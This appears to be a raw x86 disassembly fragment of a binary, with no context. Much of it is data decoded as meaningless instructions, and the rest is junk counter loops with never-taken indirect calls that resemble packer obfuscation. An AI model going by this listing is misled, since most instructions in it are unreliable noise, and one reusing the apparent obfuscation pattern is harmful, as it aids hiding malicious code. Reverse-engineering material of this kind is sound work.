  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x5f142fbc]
  40e122:	in     al,dx
  40e123:	push   esp
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e166
  40e12d:	add    BYTE PTR [edx],bh
  40e12f:	not    ecx
  40e131:	vmwrite ebp,DWORD PTR [eax]
  40e134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e135:	pop    esi
  40e136:	test   al,0x7
  40e138:	retfw  0xd3d7
  40e13c:	mov    ebx,DWORD PTR [edx-0x12]
  40e13f:	or     al,0x82
  40e141:	stos   DWORD PTR es:[edi],eax
  40e142:	pusha  
  40e143:	jb     0x40e1c1
  40e145:	pop    ecx
  40e146:	inc    edi
  40e147:	inc    edi
  40e148:	sar    DWORD PTR [ebp+0x1d],1
  40e14b:	pushf  
  40e14c:	scas   al,BYTE PTR es:[edi]
  40e14d:	test   BYTE PTR [ebx],0x72
  40e150:	jl     0x40e120
  40e152:	mov    bh,0x7f
  40e154:	mov    es,WORD PTR [edi*1-0x1e6631b3]
  40e15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e15c:	shl    ch,1
  40e15e:	imul   ecx,DWORD PTR [esi-0x524a5dca],0xb676eb2c
  40e168:	inc    BYTE PTR [ebx]
  40e16a:	sub    dl,0x4d
  40e16d:	out    dx,eax
  40e16e:	dec    esp
  40e16f:	sbb    eax,0x9757cc85
  40e174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e175:	jo     0x40e1c9
  40e177:	adc    eax,0x99d47261
  40e17c:	and    BYTE PTR [ecx],dh
  40e17e:	push   eax
  40e17f:	int3   
  40e180:	inc    edi
  40e181:	shr    BYTE PTR [eax+0x4ad2d862],1
  40e187:	xor    bl,BYTE PTR [edx]
  40e189:	jp     0x40e126
  40e18b:	inc    ebp
  40e18c:	sar    BYTE PTR [edx-0x3400dc6b],cl
  40e192:	sbb    DWORD PTR [ecx-0x60],ecx
  40e195:	sub    eax,0x49fb4851
  40e19a:	add    edx,DWORD PTR [esi+0x6e]
  40e19d:	fsub   QWORD PTR ds:0xc88fe6ac
  40e1a3:	arpl   WORD PTR [ebp-0xf31595d],ax
  40e1a9:	mov    dh,0x89
  40e1ab:	push   edi
  40e1ac:	(bad)  
  40e1ad:	xchg   ebp,eax
  40e1ae:	xchg   edi,eax
  40e1af:	lods   al,BYTE PTR ds:[esi]
  40e1b0:	dec    esp
  40e1b1:	call   0xa3698ccf
  40e1b6:	dec    ecx
  40e1b7:	arpl   WORD PTR [ebx],si
  40e1b9:	jmp    0x831a:0x94c986c9
  40e1c0:	add    bl,BYTE PTR [eax+edi*2-0x2f52322b]
  40e1c7:	pop    es
  40e1c8:	sti    
  40e1c9:	imul   esi,DWORD PTR [edx+0x72],0x56
  40e1cd:	daa    
  40e1ce:	sub    eax,0x7d478439
  40e1d3:	jno    0x40e188
  40e1d5:	out    0xb7,al
  40e1d7:	lea    eax,[ebx+0x40]
  40e1da:	xor    al,0x2d
  40e1dc:	div    bh
  40e1de:	and    eax,0x74f6c437
  40e1e3:	inc    ecx
  40e1e4:	cdq    
  40e1e5:	mov    ds:0xb531be72,eax
  40e1ea:	jl     0x40e1bc
  40e1ec:	(bad)  
  40e1ed:	jmp    0xf7f90e4b
  40e1f2:	push   0x14
  40e1f4:	dec    ebx
  40e1f5:	jns    0x40e23b
  40e1f7:	(bad)  
  40e1f8:	mov    gs,edi
  40e1fa:	dec    edi
  40e1fb:	in     al,0x4
  40e1fd:	idiv   ah
  40e1ff:	nop
  40e200:	loop   0x40e219
  40e202:	add    edi,eax
  40e204:	aas    
  40e205:	mov    ds:0x55734515,al
  40e20a:	jp     0x40e241
  40e20c:	or     bh,ch
  40e20e:	adc    eax,0x1b0b96bc
  40e213:	cdq    
  40e214:	mov    DWORD PTR ds:0xc3f5e537,edx
  40e21a:	or     cl,BYTE PTR [edi-0x4ed936eb]
  40e220:	sbb    al,0xb1
  40e222:	push   edx
  40e223:	cmc    
  40e224:	jbe    0x40e253
  40e226:	ins    BYTE PTR es:[edi],dx
  40e227:	mov    eax,ds:0x9e232e41
  40e22c:	cmp    ah,ah
  40e22e:	ss std 
  40e230:	aam    0x9
  40e232:	xchg   esp,eax
  40e233:	adc    al,0x49
  40e235:	cmp    edi,ebp
  40e237:	add    esi,DWORD PTR [ecx-0x14]
  40e23a:	cwde   
  40e23b:	and    BYTE PTR [ebx],dh
  40e23d:	dec    esi
  40e23e:	icebp  
  40e23f:	mov    ds:0x5bd2f708,eax
  40e244:	xor    eax,0x27f01e8
  40e249:	lods   eax,DWORD PTR ds:[esi]
  40e24a:	js     0x40e2ca
  40e24c:	inc    esp
  40e24d:	inc    eax
  40e24e:	sahf   
  40e24f:	mov    edx,0xcf8dd92f
  40e254:	ins    BYTE PTR es:[edi],dx
  40e255:	mov    DWORD PTR [eax+0x4d5b43a1],esp
  40e25b:	cmc    
  40e25c:	xor    DWORD PTR [edx-0x4c],ebp
  40e25f:	sar    DWORD PTR [edi+0x5ea32f60],1
  40e265:	jb     0x40e243
  40e267:	pop    esp
  40e268:	push   cs
  40e269:	sub    ebp,DWORD PTR [eax+esi*1-0x19]
  40e26d:	mov    al,ds:0x1b6938d3
  40e272:	fdivr  QWORD PTR [edx-0x3632ca94]
  40e278:	or     eax,0x458d0189
  40e27d:	cld    
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	jl     0x40e396
  40e378:	or     eax,0x70a43b9d
  40e37d:	jo     0x40e342
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e37d
  40e383:	xchg   esi,eax
  40e384:	mov    DWORD PTR cs:[edi-0x7d],0xfa0cf8ef
  40e38c:	adc    al,0x62
  40e38e:	sub    ebx,DWORD PTR [ecx]
  40e390:	aaa    
  40e391:	stc    
  40e392:	sub    BYTE PTR [edx],0xe
  40e395:	pop    ds
  40e396:	mov    ah,0x21
  40e398:	or     BYTE PTR [edx+0x29],al
  40e39b:	cwde   
  40e39c:	mov    esp,0x6f70d0e
  40e3a1:	adc    DWORD PTR [ecx-0x4d5d7b57],ebx
  40e3a7:	push   0xf39068ee
  40e3ac:	xchg   esi,eax
  40e3ad:	(bad)  
  40e3af:	repz and DWORD PTR [eax],ebx
  40e3b2:	jl     0x40e3cc
  40e3b4:	add    BYTE PTR [edx],dh
  40e3b6:	popf   
  40e3b7:	pop    ds
  40e3b8:	push   esi
  40e3b9:	xchg   edx,eax
  40e3ba:	mov    bh,0x3
  40e3bc:	add    esp,DWORD PTR [ebx-0x65]
  40e3bf:	pop    ds
  40e3c0:	mov    al,0x30
  40e3c2:	cmp    bl,dh
  40e3c4:	add    esp,DWORD PTR [eax]
  40e3c6:	sub    BYTE PTR [edi-0x6e],cl
  40e3c9:	out    0x2d,al
  40e3cb:	enter  0xc169,0xcb
  40e3cf:	sbb    BYTE PTR [ecx+0x64],al
  40e3d2:	gs aad 0x68
  40e3d5:	pop    DWORD PTR [ebp-0x67c07cc7]
  40e3db:	push   esp
  40e3dc:	rol    DWORD PTR [eax+ebx*8],1
  40e3df:	clc    
  40e3e0:	jbe    0x40e393
  40e3e2:	out    0xa1,al
  40e3e4:	push   0x88f5bc3d
  40e3e9:	jns    0x40e3c4
  40e3eb:	sahf   
  40e3ec:	test   bl,ah
  40e3ee:	jno    0x40e417
  40e3f0:	test   DWORD PTR [esi-0x36b72095],ebp
  40e3f6:	sub    bh,BYTE PTR [eax+0x49daeba4]
  40e3fc:	outs   dx,BYTE PTR ds:[esi]
  40e3fd:	jl     0x40e3d3
  40e3ff:	jg     0x40e388
  40e401:	in     al,dx
  40e402:	mov    al,BYTE PTR [edi+0x18fe3a5a]
  40e408:	fstp   TBYTE PTR [ebx]
  40e40a:	out    0xfa,eax
  40e40c:	fnsave [eax-0x67]
  40e40f:	addr16 pushf 
  40e411:	and    eax,0x71b9ea1a
  40e416:	retf   0x8c86
  40e419:	call   0xdfeb:0x68b7957
  40e420:	xor    BYTE PTR [edi-0x5d],ch
  40e423:	mov    eax,ds:0xfb29c7db
  40e428:	fisttp DWORD PTR [ebp-0x71af7339]
  40e42e:	(bad)  
  40e430:	pop    ebx
  40e431:	jae    0x40e451
  40e433:	dec    edx
  40e434:	cmp    edi,DWORD PTR [esi-0x63652894]
  40e43a:	iret   
  40e43b:	mov    BYTE PTR [edi-0x3c],bh
  40e43e:	pop    ebp
  40e43f:	and    DWORD PTR [esi],ebx
  40e441:	and    BYTE PTR [edx+ebp*8],bh
  40e444:	call   0x9bc:0x2e701297
  40e44b:	dec    edx
  40e44c:	push   cs
  40e44d:	ja     0x40e47a
  40e44f:	fistp  WORD PTR [edx+0x29c73f32]
  40e455:	or     DWORD PTR [ebx+0x79638dbf],0x60
  40e45c:	cmp    esi,ebx
  40e45e:	daa    
  40e45f:	add    eax,0xdb90a408
  40e464:	sbb    esi,DWORD PTR [ebx]
  40e466:	jp     0x40e4a1
  40e468:	jnp    0x40e4e3
  40e46a:	sbb    esp,DWORD PTR [edx+0x374182e8]
  40e470:	test   BYTE PTR [ebp-0x2],ch
  40e473:	int    0x36
  40e475:	or     DWORD PTR [eax-0x6c],ebx
  40e478:	add    eax,0x66e1d0d7
  40e47d:	in     eax,dx
  40e47e:	pop    ds
  40e47f:	iret   
  40e480:	and    eax,0x1c50dbd3
  40e485:	mov    ds:0xc93dfe0c,eax
  40e48a:	pusha  
  40e48b:	inc    eax
  40e48c:	pop    esi
  40e48d:	call   0x2670:0x7e61b9f
  40e494:	test   BYTE PTR [ebp+ebx*4-0x2bd99cfc],ah
  40e49b:	(bad)  
  40e49c:	rcr    esi,cl
  40e49e:	dec    ebp
  40e49f:	loop   0x40e49d
  40e4a1:	iret   
  40e4a2:	jmp    0x40e513
  40e4a4:	mov    ch,0x63
  40e4a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4a7:	jo     0x40e506
  40e4a9:	lea    esp,[ecx+0xa]
  40e4ac:	mov    esp,0x8584d7c6
  40e4b1:	lods   al,BYTE PTR ds:[esi]
  40e4b2:	pop    ebp
  40e4b3:	test   DWORD PTR [edi*2+0x575c95ae],ebp
  40e4ba:	pop    edx
  40e4bb:	xor    DWORD PTR ds:0xc852de86,edi
  40e4c1:	nop
  40e4c2:	arpl   WORD PTR [eax],di
  40e4c4:	sub    al,0x89
  40e4c6:	and    ebp,edi
  40e4c8:	mov    cl,0xb4
  40e4ca:	icebp  
  40e4cb:	pusha  
  40e4cc:	xor    al,0x15
  40e4ce:	stos   BYTE PTR es:[edi],al
  40e4cf:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x603f740f
  40e4f5:	jle    0x40e512
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	neg    BYTE PTR [ecx+0x547ab337]
  40e505:	xchg   ebx,eax
  40e506:	xchg   DWORD PTR [edi+0x1bc41cc8],ebx
  40e50c:	ja     0x40e4b8
  40e50e:	rol    BYTE PTR [edi-0x5c],0x8d
  40e512:	mov    esi,0x5c2c9fa7
  40e517:	bound  ecx,QWORD PTR [esi+0x627977e8]
  40e51d:	add    BYTE PTR [esi-0x61],bl
  40e520:	popa   
  40e521:	mov    ecx,0x3f7d1a6c
  40e526:	clc    
  40e527:	pop    es
  40e528:	jb     0x40e5a4
  40e52a:	retf   
  40e52b:	hlt    
  40e52c:	rol    BYTE PTR ds:0x9f5878dc,1
  40e532:	sbb    DWORD PTR [edi-0x6e054c45],0xbbdd309e
  40e53c:	sub    DWORD PTR ds:0xf3b3b0a7,0x88bb1614
  40e546:	nop
  40e547:	(bad)  
  40e549:	add    ebp,DWORD PTR [eax+0x39e50ce4]
  40e54f:	stc    
  40e550:	jb     0x40e567
  40e552:	xchg   BYTE PTR [ebx],dl
  40e554:	mov    bl,0x2d
  40e556:	sbb    al,dl
  40e558:	loopne 0x40e56e
  40e55a:	sti    
  40e55b:	shr    DWORD PTR ds:0xf1a8127a,0x7f
  40e562:	and    al,0x14
  40e564:	bound  eax,QWORD PTR [eax-0x3eefdc8b]
  40e56a:	cs (bad) 
  40e56d:	cli    
  40e56e:	cmc    
  40e56f:	jno    0x40e557
  40e571:	outs   dx,BYTE PTR ds:[esi]
  40e572:	loop   0x40e57b
  40e574:	inc    ebp
  40e575:	xor    ebx,DWORD PTR [ebp-0xcf3a1b8]
  40e57b:	cmp    DWORD PTR [ecx+0x791a50f0],0xe10628e9
  40e585:	jg     0x40e55d
  40e587:	loop   0x40e5e0
  40e589:	xchg   al,bh
  40e58b:	ins    DWORD PTR es:[edi],dx
  40e58c:	and    eax,0x971f45b1
  40e591:	loopne 0x40e52c
  40e593:	push   edx
  40e594:	imul   ebp,DWORD PTR [edi+0x65],0x72e2c229
  40e59b:	(bad)  
  40e59c:	mov    eax,ds:0x3c154042
  40e5a1:	mov    ecx,0x93146b4b
  40e5a6:	mov    bh,bh
  40e5a8:	cvtdq2ps xmm6,XMMWORD PTR ds:0xff85f65a
  40e5af:	jmp    0x875cac12
  40e5b4:	call   0x91b5a630
  40e5b9:	pop    es
  40e5ba:	fwait
  40e5bb:	lock dec DWORD PTR [eax-0x1c]
  40e5bf:	repnz sar BYTE PTR [ebp-0xf],cl
  40e5c3:	ror    DWORD PTR [eax-0xf],cl
  40e5c6:	ss inc ebp
  40e5c8:	mov    ah,0x6a
  40e5ca:	xor    ebp,DWORD PTR [ebx]
  40e5cc:	fidiv  WORD PTR [esi+0x63]
  40e5cf:	cmp    ebx,DWORD PTR [edi]
  40e5d1:	xor    ebp,DWORD PTR [ecx-0x1]
  40e5d4:	repz add eax,0x25db3172
  40e5da:	cmp    DWORD PTR [ebx],esi
  40e5dc:	cmp    bl,BYTE PTR [eax]
  40e5de:	out    dx,al
  40e5df:	repz popf 
  40e5e1:	in     al,0xde
  40e5e3:	out    0x33,al
  40e5e5:	xor    eax,0xd48d7058
  40e5ea:	jns    0x40e594
  40e5ec:	xor    DWORD PTR [ecx+edx*2-0xe9c6b16],ebp
  40e5f3:	jne    0x40e5ee
  40e5f5:	ins    DWORD PTR es:[edi],dx
  40e5f6:	popf   
  40e5f7:	fwait
  40e5f8:	popf   
  40e5f9:	jbe    0x40e5ba
  40e5fb:	pop    ebx
  40e5fc:	fsubr  QWORD PTR [esi-0x146828eb]
  40e602:	cli    
  40e603:	stos   DWORD PTR es:[edi],eax
  40e604:	xchg   ebp,eax
  40e605:	pop    ds
  40e606:	xor    al,BYTE PTR [esp+esi*8]
  40e609:	sub    al,0x3e
  40e60b:	xchg   BYTE PTR [eax-0x53],al
  40e60e:	push   ss
  40e60f:	aad    0x9a
  40e611:	icebp  
  40e612:	xchg   ebx,eax
  40e613:	fmulp  st(5),st
  40e615:	pop    ebp
  40e616:	push   eax
  40e617:	std    
  40e618:	push   ecx
  40e619:	(bad)  
  40e61a:	push   ss
  40e61b:	jp     0x40e60e
  40e61d:	test   BYTE PTR [ebx+esi*4],ch
  40e620:	scas   al,BYTE PTR es:[edi]
  40e621:	rcl    BYTE PTR [ebx-0x47894650],1
  40e627:	pop    ebp
  40e628:	xor    eax,0xb188159b
  40e62d:	xchg   edi,eax
  40e62e:	pop    eax
  40e62f:	jg     0x40e684
  40e631:	(bad)  
  40e632:	sub    ecx,DWORD PTR [esi]
  40e634:	push   cs
  40e635:	shl    DWORD PTR [ecx],0x6c
  40e638:	pop    esi
  40e639:	push   es
  40e63a:	or     BYTE PTR [ebx],dh
  40e63c:	mov    ds:0xa197a94,al
  40e641:	cs sahf 
  40e643:	das    
  40e644:	adc    al,0x2a
  40e646:	and    ch,BYTE PTR [edi+0x4e2118fb]
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	xchg   DWORD PTR [edi-0x5b],ebp
  40e6dd:	(bad)  
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	ficom  WORD PTR [esi-0x28]
  40e6e9:	sub    DWORD PTR [edi+edx*4-0x3a],edx
  40e6ed:	cmp    edi,esi
  40e6ef:	je     0x40e766
  40e6f1:	test   DWORD PTR [ebx],ebx
  40e6f3:	adc    DWORD PTR [ebp-0x1f],edx
  40e6f6:	shl    BYTE PTR [edi-0x4a888fd8],0xea
  40e6fd:	retf   
  40e6fe:	xchg   esp,eax
  40e6ff:	fst    DWORD PTR [ebp-0x53]
  40e702:	xchg   edx,eax
  40e703:	sbb    bl,BYTE PTR [ecx+0x41c4cd21]
  40e709:	div    ch
  40e70b:	clc    
  40e70c:	or     eax,0x4b05b74f
  40e711:	sub    cl,dl
  40e713:	push   ecx
  40e714:	cwde   
  40e715:	mov    ah,0x1d
  40e717:	mov    al,ds:0x5f92aa40
  40e71c:	fwait
  40e71d:	add    esp,DWORD PTR [edx]
  40e71f:	and    ch,BYTE PTR [ecx]
  40e721:	or     dl,BYTE PTR es:[edx+edi*8]
  40e725:	popf   
  40e726:	adc    esp,DWORD PTR [edx-0x3b]
  40e729:	ror    eax,0x95
  40e72c:	inc    esi
  40e72d:	push   edx
  40e72e:	imul   ebx,DWORD PTR [ebx],0x909235b9
  40e734:	jg     0x40e75a
  40e736:	cmp    al,0x7a
  40e738:	mov    ch,0xf2
  40e73a:	mov    ch,0xd6
  40e73c:	aaa    
  40e73d:	bound  ebp,QWORD PTR [ebx-0x52]
  40e740:	inc    edx
  40e741:	sbb    al,0xe5
  40e743:	mov    ecx,0xca884c46
  40e748:	(bad)  
  40e749:	sbb    ah,bl
  40e74b:	sub    eax,0xf70fb205
  40e750:	pushf  
  40e751:	in     eax,dx
  40e752:	test   dh,ch
  40e754:	xchg   BYTE PTR [ebp-0x7213b3eb],bh
  40e75a:	mov    bl,0x72
  40e75c:	(bad)  
  40e75d:	(bad)  
  40e75e:	cwde   
  40e75f:	stos   DWORD PTR es:[edi],eax
  40e760:	std    
  40e761:	jmp    FWORD PTR [eax-0x5d95da81]
  40e767:	or     ax,0xc96b
  40e76b:	mov    dh,0xf6
  40e76d:	push   edx
  40e76e:	mov    dh,0xd1
  40e770:	and    DWORD PTR [edx+0x44],esp
  40e773:	rcr    cl,0x1b
  40e776:	icebp  
  40e777:	xor    BYTE PTR [eax-0x71167641],ch
  40e77d:	inc    esi
  40e77e:	fwait
  40e77f:	gs loop 0x40e800
  40e782:	and    ecx,DWORD PTR [ebp-0x3004f3a1]
  40e788:	popa   
  40e789:	int    0xf9
  40e78b:	fiadd  DWORD PTR [edx]
  40e78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e78e:	ja     0x40e795
  40e790:	sbb    dl,BYTE PTR [esi+0x6f8bdec8]
  40e796:	pop    esi
  40e797:	ins    BYTE PTR es:[edi],dx
  40e798:	out    0xcf,eax
  40e79a:	inc    edi
  40e79b:	hlt    
  40e79c:	mov    ecx,0xbb4ed615
  40e7a1:	in     al,0x34
  40e7a3:	sub    BYTE PTR [esi],bl
  40e7a5:	lahf   
  40e7a6:	jo     0x40e7c9
  40e7a8:	mov    al,0x2
  40e7aa:	ja     0x40e7aa
  40e7ac:	xor    al,0x19
  40e7ae:	xor    BYTE PTR [edi+0x66],0x13
  40e7b2:	mov    eax,ds:0x7fff48a8
  40e7b7:	dec    esp
  40e7b8:	into   
  40e7b9:	into   
  40e7ba:	fnstsw WORD PTR [ebx+0x51]
  40e7bd:	or     eax,0x58945977
  40e7c2:	repnz out 0x39,eax
  40e7c5:	enter  0x57c1,0x58
  40e7c9:	adc    ebp,DWORD PTR [ebx+0x74]
  40e7cc:	cmp    BYTE PTR [ebx-0x79],0x1f
  40e7d0:	std    
  40e7d1:	dec    ecx
  40e7d2:	jmp    0xb0d:0x61a1549a
  40e7d9:	push   0x5a56482c
  40e7de:	daa    
  40e7df:	shl    DWORD PTR [edx-0x3d],1
  40e7e2:	(bad)
  40e7e5:	les    ebp,FWORD PTR [ebx+edx*8]
  40e7e8:	and    esi,edx
  40e7ea:	cmp    edx,DWORD PTR [edx+edi*2-0x43]
  40e7ee:	xchg   esp,eax
  40e7ef:	jge    0x40e825
  40e7f1:	and    ax,0x9b1e
  40e7f5:	mov    ch,cl
  40e7f7:	xor    edi,DWORD PTR [edx]
  40e7f9:	mov    edx,0xae49aa20
  40e7fe:	lods   eax,DWORD PTR ds:[esi]
  40e7ff:	rol    BYTE PTR [esi-0x76dedb92],cl
  40e805:	sub    al,0x8e
  40e807:	adc    al,0xcc
  40e809:	(bad)  
  40e80a:	pop    esi
  40e80b:	arpl   bx,si
  40e80d:	inc    ebx
  40e80e:	in     eax,0x21
  40e810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e811:	jle    0x40e7d5
  40e813:	inc    edi
  40e814:	mov    al,0xe6
  40e816:	js     0x40e855
  40e818:	lods   al,BYTE PTR ds:[esi]
  40e819:	cwde   
  40e81a:	mov    ah,0xf9
  40e81c:	adc    al,0x9c
  40e81e:	rol    DWORD PTR [edi+0x60],cl
  40e821:	jge    0x40e879
  40e823:	loopne 0x40e896
  40e825:	retf   
  40e826:	adc    DWORD PTR [esi],eax
  40e828:	je     0x40e87d
  40e82a:	fist   WORD PTR [ebp+0x5139ed35]
  40e830:	sbb    ch,ch
  40e832:	mov    al,ds:0x1581008b
  40e837:	jmp    0x67412b38
  40e83c:	push   eax
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	mov    WORD PTR [eax],?
  40e94b:	cmp    ebx,eax
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e8ea
  40e956:	fucomp st(2)
  40e958:	stc    
  40e959:	mov    ebx,0xa14aa544
  40e95e:	test   DWORD PTR [edx+0x37],eax
  40e961:	test   eax,0xd47eaeca
  40e966:	adc    al,0x97
  40e968:	movhps QWORD PTR [edx-0x3d],xmm5
  40e96c:	dec    esp
  40e96d:	dec    esi
  40e96e:	ret    0x3c29
  40e971:	push   edx
  40e972:	inc    ebx
  40e973:	add    BYTE PTR [esi],0xc6
  40e976:	xchg   ebp,eax
  40e977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e978:	in     al,0x6
  40e97a:	sub    eax,0x90001760
  40e97f:	xor    al,0x3d
  40e981:	leave  
  40e982:	sbb    eax,0xbbaf2e43
  40e987:	add    dl,BYTE PTR [ebp+0x3dd2aa5d]
  40e98d:	mov    eax,ds:0x4bab1c78
  40e992:	paddd  mm3,QWORD PTR [edi]
  40e995:	jo     0x40e9f2
  40e997:	repnz aad 0x2c
  40e99a:	shl    DWORD PTR [eax],1
